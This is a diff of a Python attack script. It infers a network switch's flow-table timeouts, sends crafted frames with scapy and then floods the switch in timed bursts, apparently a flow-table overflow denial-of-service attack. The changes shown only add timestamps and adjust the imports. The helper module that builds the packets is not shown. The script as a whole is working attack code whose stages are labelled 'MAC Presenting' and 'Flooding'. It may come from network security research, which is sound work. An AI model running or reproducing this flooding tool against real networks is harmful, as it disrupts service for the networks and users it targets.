@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
+import os
 import sys
 import json
 import argparse
 import random
 import time
 import csv
+from time import time, sleep
 from scapy.all import sendp
 
 from ftf_utils import FTFUtils
@@ -12,7 +14,7 @@ from ftf_utils import FTFUtils
 def stage_0(dst_ip, max_iter=1000, max_interval=100):
     hard_timeout = FTFUtils.estimate_hard_timeout(dst_ip, max_iter, max_interval)
     print(f"[*] T_hard={hard_timeout}", flush=True)
-    time.sleep(hard_timeout)
+    sleep(hard_timeout)
     af = FTFUtils.estimate_idle_timeout(dst_ip, max_iter, hard_timeout)
     print(f"[*] T_idle={af}", flush=True)
     return hard_timeout, af
@@ -32,7 +34,7 @@ def stage_1(iface, npacket, added_new_packets, attack_frequency):
     while i < n_pkts:
         j = FTFUtils.random_anp(added_new_packets)
         sendp(packets[i:i + j], iface=iface, verbose=False)
-        time.sleep(FTFUtils.random_af(attack_frequency))
+        sleep(FTFUtils.random_af(attack_frequency))
         i += j
         print(f"Packets {i}/{n_pkts}", flush=True)
     return macs
@@ -53,7 +55,7 @@ def stage_2(iface, npacket, added_new_packets, attack_frequency, macs):
     while i < n_pkts:
         j = FTFUtils.random_anp(added_new_packets)
         sendp(packets[0:i + j], iface=iface, verbose=False)
-        time.sleep(FTFUtils.random_af(attack_frequency))
+        sleep(FTFUtils.random_af(attack_frequency))
         i += j
         print(f"Packets {i}/{n_pkts}", flush=True)
 
@@ -68,24 +70,23 @@ def main():
     parser.add_argument('--out-file', type=str, default="/tmp/ftf.csv")
     args = parser.parse_args()
 
-    print("# [STAGE 0] T_idle Inference", flush=True)
+    print(f"# [STAGE 0] T_idle Inference, timestamp {int(time())}", flush=True)
     hard_timeout, attack_frequency = stage_0(args.dst_ip, args.max_iter, args.max_interval)
 
+    not_exists = not os.path.exists(args.out_file)
     with open(args.out_file, "a+", newline="") as f:
-        f.seek(0)
-        is_empty = sum(1 for _ in f) == 0
         writer = csv.writer(f)
-        if is_empty:
+        if not_exists:
             writer.writerow(["npacket", "estimated_hard_timeout", "estimated_idle_timeout"])
         writer.writerow([args.npacket, hard_timeout, attack_frequency])
         
-    print("# [STAGE 1] MAC Presenting", flush=True)
+    print(f"# [STAGE 1] MAC Presenting, timestamp {int(time())}", flush=True)
     macs = stage_1(args.iface, args.npacket, args.anp, attack_frequency)
 
-    print("# [STAGE 2] Flooding", flush=True)
+    print(f"# [STAGE 2] Flooding, timestamp {int(time())}", flush=True)
     stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs)
 
-    print("[+] Attacco completato.", flush=True)
+    print(f"[+] Attacco completato, timestamp {int(time())}", flush=True)
     
 if __name__ == '__main__':
     main()
